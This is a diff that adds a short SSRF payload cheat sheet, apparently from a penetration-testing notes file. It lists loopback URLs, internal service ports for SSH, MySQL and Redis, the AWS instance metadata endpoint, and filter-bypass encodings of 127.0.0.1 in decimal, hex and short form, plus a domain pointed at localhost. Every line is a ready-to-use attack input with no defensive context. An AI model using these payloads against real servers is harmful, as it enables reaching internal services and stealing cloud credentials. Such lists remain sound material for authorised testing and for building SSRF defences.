@@ -1,0 +1,15 @@
+SSRF
+bashhttp://127.0.0.1/
+http://localhost/
+http://169.254.169.254/latest/meta-data/   # AWS metadata
+http://0.0.0.0/
+http://[::1]/
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:6379   # Redis
+
+# Bypass filters
+http://2130706433/        # 127.0.0.1 in decimal
+http://0x7f000001/        # 127.0.0.1 in hex
+http://127.1/
+http://spoofed.domain → points to 127.0.0.1
